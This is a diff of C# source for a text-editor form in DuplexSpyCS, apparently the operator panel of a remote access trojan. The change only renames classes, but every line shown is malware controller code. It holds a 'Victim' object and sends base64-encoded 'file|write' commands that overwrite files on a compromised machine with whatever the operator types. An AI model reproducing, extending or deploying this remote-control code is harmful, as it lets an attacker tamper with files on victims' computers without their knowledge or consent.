@@ -13,7 +13,7 @@ namespace DuplexSpyCS
 {
     public partial class frmTextEditor : Form
     {
-        public Victim v;
+        public clsVictim v;
         public string currentDir;
 
         public frmTextEditor()
@@ -229,7 +229,7 @@ namespace DuplexSpyCS
                         if (result == DialogResult.No)
                             return;
 
-                        v.SendCommand($"file|write|{Crypto.b64E2Str(tb_path.Text)}|{Crypto.b64E2Str(editor.Text)}");
+                        v.SendCommand($"file|write|{clsCrypto.b64E2Str(tb_path.Text)}|{clsCrypto.b64E2Str(editor.Text)}");
                     }
 
                     tabControl1.TabPages.Remove(page);
@@ -240,12 +240,12 @@ namespace DuplexSpyCS
                     {
                         if (v == null)
                             MessageBox.Show("NULL");
-                        v.encSend(2, 0, $"file|write|{Crypto.b64E2Str(tb_path.Text)}|{Crypto.b64E2Str(editor.Text)}");
+                        v.encSend(2, 0, $"file|write|{clsCrypto.b64E2Str(tb_path.Text)}|{clsCrypto.b64E2Str(editor.Text)}");
                     }
                 }
                 else if (e.KeyCode == Keys.T)
                 {
-                    ShowTextFile(Path.Combine(currentDir, "NewFile_" + C1.GenerateFileName("txt")), string.Empty);
+                    ShowTextFile(Path.Combine(currentDir, "NewFile_" + clsTools.GenerateFileName("txt")), string.Empty);
                 }
                 else if (e.KeyCode == Keys.F) //Find text
                 {
@@ -325,7 +325,7 @@ namespace DuplexSpyCS
                 if (result == DialogResult.No)
                     return;
 
-                v.SendCommand($"file|write|{Crypto.b64E2Str(tb_path.Text)}|{Crypto.b64E2Str(editor.Text)}");
+                v.SendCommand($"file|write|{clsCrypto.b64E2Str(tb_path.Text)}|{clsCrypto.b64E2Str(editor.Text)}");
             }
 
             tabControl1.TabPages.Remove(page);
@@ -344,7 +344,7 @@ namespace DuplexSpyCS
                     if (result == DialogResult.No)
                         continue;
 
-                    v.SendCommand($"file|write|{Crypto.b64E2Str(tb_path.Text)}|{Crypto.b64E2Str(editor.Text)}");
+                    v.SendCommand($"file|write|{clsCrypto.b64E2Str(tb_path.Text)}|{clsCrypto.b64E2Str(editor.Text)}");
                 }
 
                 tabControl1.TabPages.Remove(page);
